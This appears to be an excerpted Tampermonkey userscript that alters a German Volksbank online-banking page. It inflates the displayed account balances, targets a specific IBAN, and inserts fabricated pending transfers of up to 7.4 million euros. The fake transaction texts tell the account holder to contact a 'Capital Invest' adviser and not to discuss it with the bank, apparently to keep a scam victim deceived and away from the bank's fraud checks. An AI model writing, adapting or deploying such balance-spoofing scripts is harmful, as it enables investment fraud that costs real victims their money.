// ==UserScript==
// @name         Volks combined Alfred Buck
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Modify account balance values, update data-positive attribute, and remove currency elements
// @author       You
// @match        https://www.vbidr.de/*
// @match        https://www.drivehq.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/481941/Volks%20combined%20Alfred%20Buck.user.js
// @updateURL https://update.greasyfork.org/scripts/481941/Volks%20combined%20Alfred%20Buck.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  100100 },
        { index: 1, adjustmentAmount: 100100 },
        { index: 2, adjustmentAmount: 100100 },
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE38 6039 1310";
    var targetTextContent2 = " 0060 7970 02";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 100100.0; // Adjust the amount as needed
    ...
    const TRANSACTIONS = [
        {
            ...
            description: 'Freigabe nötig. Wenden Sie sich an Capital Invest Berater, nicht die Bank, damit nicht gesperrt.',
            amount: '7.377.964,00',
            date: 'Vorgemerkt',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
      ...
      {
            title: 'Payward Limited',
            description: 'Bitte wenden Sie sich an Capital Invest Berater. Mit der Bank gar nicht besprechen, damit nicht gesperrt.',
            amount: '95.000,00',
            date: '22 Dez.',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
      ...
      {
            title: 'Payward Limited',
            description: 'Weihnachtsgeschenk von Alex',
            amount: '5.000,00',
            date: '22 Dez.',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
